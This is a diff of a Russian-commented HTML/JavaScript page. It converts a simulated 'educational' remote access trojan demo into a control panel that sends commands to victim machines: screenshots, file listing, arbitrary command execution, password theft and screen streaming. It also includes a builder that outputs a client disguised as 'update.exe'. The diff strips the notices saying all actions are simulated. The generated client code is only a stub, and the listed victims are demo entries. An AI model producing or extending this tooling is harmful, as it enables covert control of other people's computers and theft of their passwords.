+            const timestamp = new Date().toLocaleTimeString();
+            
+            if (data.success) {
+                consoleElem.innerHTML += `
+                    <div class="log-entry info">
+                        [${timestamp}] Команда "${data.command}" выполнена успешно
+                    </div>
+                `;
+                
+                // Обработка специфических результатов
+                switch(data.command) {
+                    case 'screenshot':
+                        showScreenshot(data.result.image);
+                        break;
+                    case 'list_files':
+                        displayFileList(data.result.files);
+                        break;
+                    case 'execute':
+                        displayCommandOutput(data.result);
+                        break;
+                }
+            } else {
+                consoleElem.innerHTML += `
+                    <div class="log-entry error">
+                        [${timestamp}] Ошибка выполнения "${data.command}": ${data.error}
+                    </div>
+                `;
+            }
+            
+            consoleElem.scrollTop = consoleElem.scrollHeight;
+            updateStats();
+        }
+        
+        // Показать скриншот
+        function showScreenshot(imageData) {
+            const screenView = document.getElementById('screenView');
+            screenView.innerHTML = `<img src="data:image/png;base64,${imageData}" alt="Скриншот">`;
+            
+            // Переключаемся на вкладку экрана
+            switchTab('screen');
+        }
+        
+        // Создание RAT
+        function createRat() {
+            showBuilderModal();
+        }
+        
+        // Сборка RAT
+        function buildRat() {
+            const ratName = document.getElementById('ratName').value || 'update.exe';
+            const serverUrl = document.getElementById('serverUrl').value;
+            
+            if (!serverUrl) {
+                showNotification('Введите URL сервера', 'error');
+                return;
+            }
+            
+            // Создаем виртуальный файл для скачивания
+            const ratCode = generateRatCode(serverUrl);
+            const blob = new Blob([ratCode], { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = ratName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showNotification(`RAT создан: ${ratName}`, 'success');
+            closeModal('builderModal');
+        }
+        
+        // Генерация кода RAT
+        function generateRatCode(serverUrl) {
+            return `# RAT Client для ${serverUrl}
+# Автоматически сгенерирован
+import socket, os, sys, json, base64
+
+SERVER = "${serverUrl.replace('https://', '').replace('http://', '')}"
+PORT = 443
+
+def connect_to_server():
+    # Реализация подключения
+    pass
+
+# Основной код RAT будет здесь`;
+        }
+        
+        // Вспомогательные функции
+        function showNotification(message, type = 'info') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.background = type === 'error' ? '#f44336' : 
+                                          type === 'warning' ? '#ff9800' : '#4CAF50';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
         function switchTab(tabName) {
-            // Скрыть все вкладки
+            // Скрываем все вкладки
             document.querySelectorAll('.tab-content').forEach(tab => {
                 tab.classList.remove('active');
             });
             
-            // Убрать active со всех вкладок
+            // Убираем активный класс со всех кнопок
             document.querySelectorAll('.tab').forEach(tab => {
                 tab.classList.remove('active');
             });
             
-            // Показать нужную вкладку
-            document.getElementById(tabName + '-tab').classList.add('active');
+            // Показываем выбранную вкладку
+            document.getElementById(tabName + 'Tab').classList.add('active');
             
-            // Активировать нужную кнопку
+            // Активируем кнопку
             event.target.classList.add('active');
         }
         
-        // Генерация демо-RAT
-        function generateRat() {
-            const name = document.getElementById('ratName').value.trim();
-            if (!name) {
-                alert('Введите имя для RAT!');
-                return;
-            }
-            
-            // Генерируем демонстрационные данные
-            const fileName = name.endsWith('.exe') ? name : name + '.exe';
-            const fileSize = Math.floor(Math.random() * 5000000) + 1000000; // 1-6 MB
-            const fileHash = 'DEMO-' + Math.random().toString(36).substr(2, 16).toUpperCase();
-            
-            // Показываем информацию о файле
-            document.getElementById('fileName').textContent = fileName;
-            document.getElementById('fileSize').textContent = fileSize.toLocaleString();
-            document.getElementById('fileHash').textContent = fileHash;
-            document.getElementById('ratFile').style.display = 'block';
-            
-            // Логируем создание
-            addToLog(`[RAT CREATED] ${fileName} (${(fileSize/1024/1024).toFixed(2)} MB)`);
-            
-            // Симуляция отправки уведомления
-            setTimeout(() => {
-                addToLog('[SYSTEM] Демо-RAT "отправлен" жертве');
-                addToLog('[SYSTEM] Ожидание запуска...');
-            }, 1000);
+        function showModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
         }
         
-        // Имитация подключения жертвы
-        function simulateVictim() {
-            document.getElementById('no-victims').style.display = 'none';
-            document.getElementById('victims-list').style.display = 'block';
-            
-            addToLog('[VICTIM CONNECTED] Victim-PC-01 подключился');
-            addToLog('[INFO] Система: Windows 10 Pro x64');
-            addToLog('[INFO] IP: 192.168.1.105 (демо)');
-            addToLog('[INFO] Пользователь: Admin (демо)');
-            
-            // Показываем уведомление
-            showNotification('⚠️ Новая жертва подключилась!');
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
         }
         
-        // Отправка команды (демо)
-        function sendCommand(cmd) {
-            const commands = {
-                'screenshot': '[CMD] Скриншот сделан (имитация)',
-                'cmd': '[CMD] Терминал открыт (имитация)',
-                'keylogger': '[CMD] Запись клавиш начата (имитация)',
-                'files': '[CMD] Список файлов получен (имитация)',
-                'shutdown': '[CMD] Команда выключения отправлена (имитация)',
-                'format': '[WARNING] Опасная команда! Только демо (имитация)'
-            };
+        function updateStats() {
+            const total = Object.keys(victims).length;
+            const online = total; // В демо все онлайн
             
-            if (commands[cmd]) {
-                addToLog(commands[cmd]);
-                
-                // Для опасных команд показываем предупреждение
-                if (cmd === 'format') {
-                    showNotification('⛔ Опасная команда отправлена (демо)');
+            document.getElementById('totalClients').textContent = total;
+            document.getElementById('onlineClients').textContent = online;
+            document.getElementById('commandsSent').textContent = 
+                parseInt(document.getElementById('commandsSent').textContent) + 1;
+        }
+        
+        // Демо-функции
+        function simulateVictimConnection() {
+            const demoVictims = [
+                {
+                    id: 'victim-001',
+                    computerName: 'OFFICE-PC-01',
+                    user: 'Алексей',
+                    os: 'Windows 10 Pro',
+                    ip: '192.168.1.105'
+                },
+                {
+                    id: 'victim-002',
+                    computerName: 'HOME-PC',
+                    user: 'Мария',
+                    os: 'Windows 11 Home',
+                    ip: '192.168.1.110'
+                },
+                {
+                    id: 'victim-003',
+                    computerName: 'GAMER-PC',
+                    user: 'Дмитрий',
+                    os: 'Windows 10 Gaming',
+                    ip: '192.168.1.120'
                 }
-            }
-        }
-        
-        // Добавление в лог
-        function addToLog(message) {
-            const log = document.getElementById('commandLog');
-            const timestamp = new Date().toLocaleTimeString();
-            log.innerHTML += `[${timestamp}] ${message}<br>`;
-            log.scrollTop = log.scrollHeight;
-        }
-        
-        // Показать уведомление
-        function showNotification(message) {
-            // Проверяем поддержку уведомлений
-            if (!("Notification" in window)) {
-                alert(message);
-                return;
-            }
+            ];
             
-            // Запрашиваем разрешение
-            if (Notification.permission === "granted") {
-                new Notification("Educational RAT Demo", {
-                    body: message,
-                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="%23667eea"/></svg>'
-                });
-            } else if (Notification.permission !== "denied") {
-                Notification.requestPermission().then(permission => {
-                    if (permission === "granted") {
-                        new Notification("Educational RAT Demo", {
-                            body: message,
-                            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="%23667eea"/></svg>'
-                        });
-                    }
-                });
-            }
+            demoVictims.forEach(victim => {
+                setTimeout(() => {
+                    addVictim(victim);
+                    showNotification(`Новая жертва подключилась: ${victim.computerName}`, 'info');
+                }, Math.random() * 3000);
+            });
+            
+            // Выбираем первую жертву
+            setTimeout(() => selectVictim('victim-001'), 4000);
         }
         
-        // Инициализация
-        document.addEventListener('DOMContentLoaded', function() {
-            // Запрашиваем разрешение на уведомления
-            if ("Notification" in window) {
-                Notification.requestPermission();
+        // Экспорт функций для HTML
+        window.showBuilderModal = () => showModal('builderModal');
+        window.showCmdModal = () => showModal('cmdModal');
+        window.showShutdownModal = () => showModal('shutdownModal');
+        window.closeModal = closeModal;
+        window.switchTab = switchTab;
+        window.sendCommand = sendCommand;
+        window.executeCommand = () => {
+            const cmd = document.getElementById('cmdInput').value;
+            if (cmd) {
+                sendCommand('execute', { command: cmd });
+                closeModal('cmdModal');
             }
-            
-            // Добавляем начальное сообщение в лог
-            setTimeout(() => {
-                addToLog('[SYSTEM] Демонстрационная система готова');
-                addToLog('[INFO] Все действия имитируются и безопасны');
-            }, 500);
-        });
+        };
+        
+        // Демо-команды
+        window.listFiles = () => {
+            sendCommand('list_files', { path: 'C:\\Users' });
+        };
+        
+        window.stealPasswords = () => {
+            sendCommand('steal_passwords');
+            showNotification('Кража паролей запущена...', 'info');
+        };
+        
+        window.startScreenStream = () => {
+            sendCommand('start_stream');
+            showNotification('Трансляция экрана запущена', 'info');
+        };
     </script>
 </body>
 </html>
